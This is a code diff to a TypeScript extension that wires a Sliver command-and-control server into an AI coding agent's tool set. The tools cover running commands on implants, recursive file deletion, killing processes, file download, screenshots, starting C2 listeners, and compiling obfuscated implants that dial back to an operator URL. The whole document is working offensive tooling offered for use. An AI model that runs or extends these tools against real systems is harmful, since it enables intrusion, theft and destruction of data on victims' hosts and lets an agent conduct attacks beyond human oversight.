@@ -3,7 +3,7 @@
  *
  * Exposes a Sliver server's gRPC operator API to the Pi coding agent as
  * native tools, plus live notifications when new sessions/beacons check in.
- * Uses `sliver-script` (Bishop Fox / moloch--) under the hood — the same
+ * Uses `sliver-script` v2 (sliverarmory fork) under the hood — the same
  * operator `.cfg` you'd point `sliver-client` at.
  *
  * Configuration:
@@ -11,10 +11,6 @@
  *   PI_SLIVER_DISABLE       Any non-empty value disables the extension.
  *   PI_SLIVER_DOWNLOAD_DIR  Local dir for downloads/screenshots/built implants.
  *                           Default: $TMPDIR/pi-sliver.
- *
- * Auto-discovery scans ~/.sliver-client/configs/*.cfg and picks the
- * most-recently-modified file. When no config is found, tool calls return a
- * clear error rather than crashing the extension at load time.
  *
  * License: MIT
  */
@@ -24,12 +20,13 @@ import { Type } from "@sinclair/typebox";
 import { homedir, tmpdir } from "node:os";
 import { basename, join } from "node:path";
 import { mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from "node:fs";
-import { ParseConfigFile, SliverClient, type SliverClientConfig } from "sliver-script";
-import type { InteractiveBeacon, InteractiveSession } from "sliver-script";
-// Deep import — sliver-script's top-level index doesn't re-export the
-// generated proto namespaces, but we need clientpb.ImplantConfig (and
-// clientpb.OutputFormat) to build a real protobuf Message for `generate()`.
-import { clientpb } from "sliver-script/lib/pb/clientpb/client.js";
+import {
+  ParseConfigFile,
+  SliverClient,
+  type SliverClientConfig,
+  type InteractiveBeacon,
+  type InteractiveSession,
+} from "sliver-script";
 
 // ---------------------------------------------------------------------------
 // Config + connection state
@@ -96,7 +93,7 @@ function subscribeEvents(c: SliverClient) {
   } catch {}
   const sub = c.event$.subscribe((event: any) => {
     if (!uiRef) return;
-    const t: string = event?.EventType ?? event?.eventType ?? "";
+    const t: string = event?.EventType ?? "";
     try {
       if (t === "session-connected" && event.Session) {
         const s = event.Session;
@@ -137,25 +134,16 @@ type Content =
 
 type ToolResult = { content: Content[]; details: unknown };
 
-// google-protobuf message objects don't serialize as readable JSON — they
-// expose internal short keys (D, u, G, …) via the default toJSON path.
-// `.toObject()` on the generated Message gives a plain JS object with the
-// real field names. We apply it recursively because RPCs frequently return
-// arrays/maps of messages.
-function pbToObject(v: unknown): unknown {
+// ts-proto returns `bytes` fields as Uint8Array, which JSON.stringify renders
+// as {0: 1, 1: 2, ...}. Walk the object and base64 any byte payloads so the
+// agent sees usable strings. Buffer is a Uint8Array subtype.
+function normalize(v: unknown): unknown {
   if (v == null) return v;
-  if (typeof (v as any).toObject === "function") {
-    try {
-      return pbToObject((v as any).toObject());
-    } catch {
-      // fall through to generic handling
-    }
-  }
-  if (Array.isArray(v)) return v.map(pbToObject);
-  if (Buffer.isBuffer(v) || v instanceof Uint8Array) return Buffer.from(v as Uint8Array).toString("base64");
+  if (v instanceof Uint8Array) return Buffer.from(v).toString("base64");
+  if (Array.isArray(v)) return v.map(normalize);
   if (typeof v === "object") {
     const out: Record<string, unknown> = {};
-    for (const [k, val] of Object.entries(v as object)) out[k] = pbToObject(val);
+    for (const [k, val] of Object.entries(v as object)) out[k] = normalize(val);
     return out;
   }
   return v;
@@ -165,7 +153,7 @@ function textResult(text: string, details: unknown = null): ToolResult {
   return { content: [{ type: "text", text }], details };
 }
 function jsonResult(obj: unknown): ToolResult {
-  const plain = pbToObject(obj);
+  const plain = normalize(obj);
   return { content: [{ type: "text", text: JSON.stringify(plain, null, 2) }], details: plain };
 }
 function errorResult(e: unknown): ToolResult {
@@ -203,11 +191,39 @@ function toBuffer(v: unknown): Buffer {
   return Buffer.alloc(0);
 }
 
-// Convert a seconds value to a protobuf int64-encoded nanosecond duration.
-// sliver-script accepts plain numbers via the generated proto; we coerce
-// through Number here since the JS protobuf runtime tolerates it.
-function nsFromSeconds(sec: number): number {
-  return Math.max(0, Math.floor(sec)) * 1_000_000_000;
+function decodeBytes(v: unknown): string {
+  if (!v) return "";
+  if (v instanceof Uint8Array) return Buffer.from(v).toString("utf8");
+  if (typeof v === "string") {
+    // Already base64-encoded by `normalize()`? In raw responses we get
+    // Uint8Array, but defensively handle base64 too.
+    try {
+      return Buffer.from(v, "base64").toString("utf8");
+    } catch {
+      return v;
+    }
+  }
+  return "";
+}
+
+// Sliver ImplantConfig durations are int64 nanoseconds encoded as decimal
+// strings in the modern proto. Older builds used numbers, which the new
+// server quietly rejects with "record not found".
+function nsString(seconds: number): string {
+  return String(Math.max(0, Math.floor(seconds)) * 1_000_000_000);
+}
+
+// Map a C2 URL scheme to the right Include* flag on ImplantConfig.
+function includeFlagsFor(c2Url: string): Record<string, boolean> {
+  const scheme = c2Url.match(/^([a-z+]+):/i)?.[1]?.toLowerCase() ?? "";
+  return {
+    IncludeMTLS: scheme === "mtls",
+    IncludeHTTP: scheme === "http" || scheme === "https",
+    IncludeDNS: scheme === "dns",
+    IncludeWG: scheme === "wg",
+    IncludeNamePipe: scheme === "namedpipe",
+    IncludeTCP: scheme === "tcppivot",
+  };
 }
 
 // ---------------------------------------------------------------------------
@@ -219,8 +235,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
 
   pi.on("session_start", async (_event, ctx) => {
     if (ctx.hasUI) uiRef = ctx.ui;
-    // Best-effort eager connect so events start flowing immediately. Failures
-    // are swallowed — tool calls will surface them with a clear message.
+    // Best-effort eager connect so events start flowing immediately.
     getClient().catch(() => {});
   });
 
@@ -263,7 +278,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
         const c = await getClient();
         const [version, operators, sessions, beacons, jobs] = await Promise.all([
           c.getVersion().catch(() => undefined),
-          c.getOperators().catch(() => []),
+          c.operators().catch(() => []),
           c.sessions().catch(() => []),
           c.beacons().catch(() => []),
           c.jobs().catch(() => []),
@@ -324,7 +339,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     async execute() {
       try {
         const c = await getClient();
-        return jsonResult((await c.getOperators()) ?? []);
+        return jsonResult((await c.operators()) ?? []);
       } catch (e) {
         return errorResult(e);
       }
@@ -337,7 +352,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     name: "sliver_exec",
     label: "Sliver: execute",
     description:
-      "Run a command on an implant (session or beacon). Returns stdout, stderr, exit status, and PID when `output` is true.",
+      "Run a command on an implant (session or beacon). For sessions returns stdout, stderr, exit status, and PID. For beacons the call queues a task — the response contains the TaskID.",
     parameters: Type.Object({
       ...TargetSchema,
       exe: Type.String({ description: "Executable path on the implant (e.g. /usr/bin/whoami, C:\\Windows\\System32\\cmd.exe)" }),
@@ -349,16 +364,12 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
       try {
         const target = await getTarget(p);
         const res: any = await target.execute(p.exe, p.args ?? [], p.output ?? true, p.timeout);
-        const plain: any = pbToObject(res) ?? {};
-        // Decode stdout/stderr if present (toObject leaves byte fields as base64 strings).
-        const decode = (v: unknown): string =>
-          typeof v === "string" ? Buffer.from(v, "base64").toString("utf8") : "";
         return jsonResult({
-          status: plain.status ?? plain.Status,
-          pid: plain.pid ?? plain.Pid,
-          stdout: decode(plain.stdout ?? plain.Stdout),
-          stderr: decode(plain.stderr ?? plain.Stderr),
-          response: plain.response ?? plain.Response,
+          status: res?.Status,
+          pid: res?.Pid,
+          stdout: decodeBytes(res?.Stdout),
+          stderr: decodeBytes(res?.Stderr),
+          response: res?.Response,
         });
       } catch (e) {
         return errorResult(e);
@@ -417,12 +428,17 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
   pi.registerTool({
     name: "sliver_rm",
     label: "Sliver: rm",
-    description: "Delete a file or empty directory on the implant.",
-    parameters: Type.Object({ ...TargetSchema, path: Type.String() }),
+    description: "Delete a file or directory on the implant.",
+    parameters: Type.Object({
+      ...TargetSchema,
+      path: Type.String(),
+      recursive: Type.Optional(Type.Boolean({ default: false })),
+      force: Type.Optional(Type.Boolean({ default: false })),
+    }),
     async execute(_id, p) {
       try {
         const t = await getTarget(p);
-        return jsonResult(await t.rm(p.path));
+        return jsonResult(await t.rm(p.path, p.recursive, p.force));
       } catch (e) {
         return errorResult(e);
       }
@@ -457,6 +473,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     async execute(_id, p) {
       try {
         const t = await getTarget(p);
+        // v2 download already gunzips and returns a Buffer.
         const buf = await t.download(p.path);
         const limit = p.max_bytes ?? 65536;
         const out = buf.subarray(0, limit).toString("utf8");
@@ -520,11 +537,14 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     name: "sliver_ps",
     label: "Sliver: ps",
     description: "Process list on the implant.",
-    parameters: Type.Object({ ...TargetSchema }),
+    parameters: Type.Object({
+      ...TargetSchema,
+      full_info: Type.Optional(Type.Boolean({ description: "Return extended per-process info", default: false })),
+    }),
     async execute(_id, p) {
       try {
         const t = await getTarget(p);
-        return jsonResult(await t.ps());
+        return jsonResult(await t.ps(p.full_info));
       } catch (e) {
         return errorResult(e);
       }
@@ -565,11 +585,15 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     name: "sliver_terminate",
     label: "Sliver: terminate process",
     description: "Kill a process on the implant by PID.",
-    parameters: Type.Object({ ...TargetSchema, pid: Type.Number() }),
+    parameters: Type.Object({
+      ...TargetSchema,
+      pid: Type.Number(),
+      force: Type.Optional(Type.Boolean({ default: false })),
+    }),
     async execute(_id, p) {
       try {
         const t = await getTarget(p);
-        return jsonResult(await t.terminate(p.pid));
+        return jsonResult(await t.terminate(p.pid, p.force));
       } catch (e) {
         return errorResult(e);
       }
@@ -585,9 +609,8 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     async execute(_id, p) {
       try {
         const t = await getTarget(p);
-        const shot: any = pbToObject(await t.screenshot()) ?? {};
-        const data: unknown = shot.data ?? shot.Data;
-        const buf = typeof data === "string" ? Buffer.from(data, "base64") : toBuffer(data);
+        const shot: any = await t.screenshot();
+        const buf = toBuffer(shot?.Data);
         const dir = ensureDownloadDir();
         const path = join(dir, `screenshot-${Date.now()}.png`);
         writeFileSync(path, buf);
@@ -643,12 +666,11 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     parameters: Type.Object({
       host: Type.String({ description: "Bind address (e.g. 0.0.0.0)" }),
       port: Type.Number({ minimum: 1, maximum: 65535 }),
-      persistent: Type.Optional(Type.Boolean({ default: false })),
     }),
     async execute(_id, p) {
       try {
         const c = await getClient();
-        return jsonResult(await c.startMTLSListener(p.host, p.port, p.persistent));
+        return jsonResult(await c.startMTLSListener(p.host, p.port));
       } catch (e) {
         return errorResult(e);
       }
@@ -664,12 +686,12 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
       host: Type.String({ description: "Bind address" }),
       port: Type.Number({ minimum: 1, maximum: 65535 }),
       website: Type.Optional(Type.String()),
-      persistent: Type.Optional(Type.Boolean({ default: false })),
+      enforce_otp: Type.Optional(Type.Boolean({ default: false })),
     }),
     async execute(_id, p) {
       try {
         const c = await getClient();
-        return jsonResult(await c.startHTTPListener(p.domain, p.host, p.port, p.website, p.persistent));
+        return jsonResult(await c.startHTTPListener(p.domain, p.host, p.port, p.website, p.enforce_otp));
       } catch (e) {
         return errorResult(e);
       }
@@ -684,9 +706,9 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
       domain: Type.String(),
       host: Type.String(),
       port: Type.Number({ minimum: 1, maximum: 65535 }),
-      acme: Type.Optional(Type.Boolean({ default: false })),
       website: Type.Optional(Type.String()),
-      persistent: Type.Optional(Type.Boolean({ default: false })),
+      acme: Type.Optional(Type.Boolean({ default: false })),
+      enforce_otp: Type.Optional(Type.Boolean({ default: false })),
     }),
     async execute(_id, p) {
       try {
@@ -696,11 +718,11 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
             p.domain,
             p.host,
             p.port,
-            p.acme,
             p.website,
+            p.acme,
             undefined,
             undefined,
-            p.persistent,
+            p.enforce_otp,
           ),
         );
       } catch (e) {
@@ -718,13 +740,13 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
       canaries: Type.Optional(Type.Boolean({ default: true })),
       host: Type.String(),
       port: Type.Number({ minimum: 1, maximum: 65535, default: 53 }),
-      persistent: Type.Optional(Type.Boolean({ default: false })),
+      enforce_otp: Type.Optional(Type.Boolean({ default: false })),
     }),
     async execute(_id, p) {
       try {
         const c = await getClient();
         return jsonResult(
-          await c.startDNSListener(p.domains, p.canaries ?? true, p.host, p.port, p.persistent),
+          await c.startDNSListener(p.domains, p.canaries ?? true, p.host, p.port, p.enforce_otp),
         );
       } catch (e) {
         return errorResult(e);
@@ -737,15 +759,16 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     label: "Sliver: start WireGuard listener",
     description: "Start a WireGuard C2 listener.",
     parameters: Type.Object({
-      port: Type.Number(),
+      host: Type.String({ description: "Bind address" }),
+      port: Type.Number({ minimum: 1, maximum: 65535 }),
+      tun_ip: Type.String({ description: "WireGuard tunnel IP for the implant peer" }),
       n_port: Type.Number({ description: "Implant n-port" }),
       key_port: Type.Number({ description: "Key exchange port" }),
-      persistent: Type.Optional(Type.Boolean({ default: false })),
     }),
     async execute(_id, p) {
       try {
         const c = await getClient();
-        return jsonResult(await c.startWGListener(p.port, p.n_port, p.key_port, p.persistent));
+        return jsonResult(await c.startWGListener(p.host, p.port, p.tun_ip, p.n_port, p.key_port));
       } catch (e) {
         return errorResult(e);
       }
@@ -778,10 +801,9 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     async execute(_id, p) {
       try {
         const c = await getClient();
-        const f: any = pbToObject(await c.regenerate(p.name)) ?? {};
-        const data: unknown = f.data ?? f.Data;
-        const buf = typeof data === "string" ? Buffer.from(data, "base64") : toBuffer(data);
-        const name = f.name ?? f.Name ?? p.name;
+        const file: any = await c.regenerate(p.name);
+        const buf = toBuffer(file?.Data);
+        const name = file?.Name ?? p.name;
         const dir = ensureDownloadDir();
         const path = join(dir, name);
         writeFileSync(path, buf);
@@ -812,7 +834,7 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
     name: "sliver_implant_generate",
     label: "Sliver: generate implant",
     description:
-      "Compile a new Sliver implant. Saves the binary to the pi-sliver download dir and returns the local path.",
+      "Compile a new Sliver implant. Saves the binary to the pi-sliver download dir and returns the local path. Requires an external builder registered with the server (sliver-server builder).",
     parameters: Type.Object({
       name: Type.String({ description: "Implant name (also used as binary filename)" }),
       os: Type.Union(
@@ -837,7 +859,8 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
         ),
       ),
       c2_url: Type.String({
-        description: "C2 URL the implant will dial back to, e.g. mtls://operator.example:8443",
+        description:
+          "C2 URL the implant dials back to. Scheme picks the transport: mtls://host:port, http(s)://host[:port], dns://domain, wg://…, tcppivot://…, namedpipe://…",
       }),
       is_beacon: Type.Optional(
         Type.Boolean({ description: "If true, build a beacon (checkin-based)", default: false }),
@@ -846,35 +869,78 @@ export default async function piSliverExtension(pi: ExtensionAPI) {
       beacon_jitter_seconds: Type.Optional(Type.Number({ default: 30 })),
       debug: Type.Optional(Type.Boolean({ default: false })),
       evasion: Type.Optional(Type.Boolean({ default: false })),
+      obfuscate_symbols: Type.Optional(Type.Boolean({ default: true })),
+      http_c2_config_name: Type.Optional(
+        Type.String({ description: "Named HTTP C2 profile to embed (default: 'default')", default: "default" }),
+      ),
     }),
     async execute(_id, p) {
       try {
         const c = await getClient();
-        const formatMap: Record<string, clientpb.OutputFormat> = {
-          SHARED_LIB: clientpb.OutputFormat.SHARED_LIB,
-          SHELLCODE: clientpb.OutputFormat.SHELLCODE,
-          EXECUTABLE: clientpb.OutputFormat.EXECUTABLE,
-          SERVICE: clientpb.OutputFormat.SERVICE,
+        const formatMap: Record<string, number> = {
+          SHARED_LIB: 0,
+          SHELLCODE: 1,
+          EXECUTABLE: 2,
+          SERVICE: 3,
         };
-        const c2 = new clientpb.ImplantC2({ URL: p.c2_url, Priority: 0 });
-        const config = new clientpb.ImplantConfig({
-          Name: p.name,
+        const includes = includeFlagsFor(p.c2_url);
+        // ts-proto ImplantConfig — plain TS object; durations are decimal-string
+        // nanoseconds; Include* flags must match the C2 transport.
+        const config: any = {
+          ID: "",
+          ImplantBuilds: [],
+          ImplantProfileID: "",
+          IsBeacon: p.is_beacon ?? false,
+          BeaconInterval: nsString(p.beacon_interval_seconds ?? 60),
+          BeaconJitter: nsString(p.beacon_jitter_seconds ?? 30),
           GOOS: p.os,
           GOARCH: p.arch ?? "amd64",
-          Format: formatMap[p.format ?? "EXECUTABLE"],
-          IsBeacon: p.is_beacon ?? false,
-          BeaconInterval: nsFromSeconds(p.beacon_interval_seconds ?? 60),
-          BeaconJitter: nsFromSeconds(p.beacon_jitter_seconds ?? 30),
           Debug: p.debug ?? false,
           Evasion: p.evasion ?? false,
-          C2: [c2],
-          ReconnectInterval: nsFromSeconds(60),
+          ObfuscateSymbols: p.obfuscate_symbols ?? true,
+          TemplateName: "sliver",
+          SGNEnabled: false,
+          GoPackage: "",
+          IncludeMTLS: includes.IncludeMTLS,
+          IncludeHTTP: includes.IncludeHTTP,
+          IncludeWG: includes.IncludeWG,
+          IncludeDNS: includes.IncludeDNS,
+          IncludeNamePipe: includes.IncludeNamePipe,
+          IncludeTCP: includes.IncludeTCP,
+          WGPeerTunIP: "",
+          WGKeyExchangePort: 0,
+          WGTcpCommsPort: 0,
+          ReconnectInterval: nsString(60),
           MaxConnectionErrors: 1000,
-        });
-        const f: any = pbToObject(await c.generate(config)) ?? {};
-        const data: unknown = f.data ?? f.Data;
-        const buf = typeof data === "string" ? Buffer.from(data, "base64") : toBuffer(data);
-        const name = f.name ?? f.Name ?? p.name;
+          PollTimeout: nsString(360),
+          C2: [{ ID: "", Priority: 0, URL: p.c2_url, Options: "" }],
+          CanaryDomains: [],
+          ConnectionStrategy: "",
+          LimitDomainJoined: false,
+          LimitDatetime: "",
+          LimitHostname: "",
+          LimitUsername: "",
+          LimitFileExists: "",
+          LimitLocale: "",
+          Format: formatMap[p.format ?? "EXECUTABLE"],
+          IsSharedLib: (p.format ?? "EXECUTABLE") === "SHARED_LIB",
+          IsService: (p.format ?? "EXECUTABLE") === "SERVICE",
+          IsShellcode: (p.format ?? "EXECUTABLE") === "SHELLCODE",
+          RunAtLoad: false,
+          DebugFile: "",
+          exports: [],
+          ShellcodeEncoder: 0,
+          HTTPC2ConfigName: p.http_c2_config_name ?? "default",
+          NetGoEnabled: false,
+          TrafficEncodersEnabled: false,
+          TrafficEncoders: [],
+          Extension: "",
+          Assets: [],
+          Name: p.name,
+        };
+        const file: any = await c.generate(config, 600);
+        const buf = toBuffer(file?.Data);
+        const name = file?.Name ?? p.name;
         const dir = ensureDownloadDir();
         const local = join(dir, name);
         writeFileSync(local, buf);
